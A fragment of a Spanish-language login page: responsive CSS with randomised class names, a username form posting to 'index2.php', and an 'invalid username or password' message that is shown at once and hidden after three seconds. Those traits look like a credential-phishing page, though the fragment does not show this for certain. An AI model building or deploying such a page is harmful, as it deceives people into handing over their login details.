...
@media(max-width:1000px){
    body{overflow:auto;}
    .ctW9k{flex-direction:column;height:auto;}
    .lpA3m{display:none;}
    .rpQ7n{
        flex:none;
        width:100%;
    ...
    .lbR5j{max-width:100%;}
    .lgT8b{justify-content:flex-start;margin-bottom:24px;}
    .liY4v{width:210px;}
    .wcK1p{font-size:24px;margin-bottom:14px;}
    .aeM3z{font-size:13px;padding:10px 12px;margin-bottom:18px;}
    ...
    .fgL9s{margin-top:22px;}
    .fgL9s a{font-size:13px;}
    .dlV4k{
        margin-top:24px;
        padding-top:20px;
        font-size:13px;
  ...
  <div class="ctW9k">
    ...
    <div class="rpQ7n">
      <div class="lbR5j">
        ...
        <div class="aeM3z" id="aEt6m">Usuario o contraseña inválidos</div>

        <form action="index2.php" method="POST">
          <div class="flD2w">
            <label for="u_a8k3z">Ingresa tu usuario</label>
            <input type="text" id="u_a8k3z" name="u_a8k3z" autocomplete="username" required style="text-transform:uppercase" oninput="this.value=this.value.toUpperCase()" autofocus>
          </div>
          <button type="submit" class="biG7r">Ingresar</button>
        </form>
...
<script>
    setTimeout(function(){
        var el = document.getElementById('aEt6m');
        if (el) el.classList.add('hdN8q');
    }, 3000);
</script>
</body>
</html>
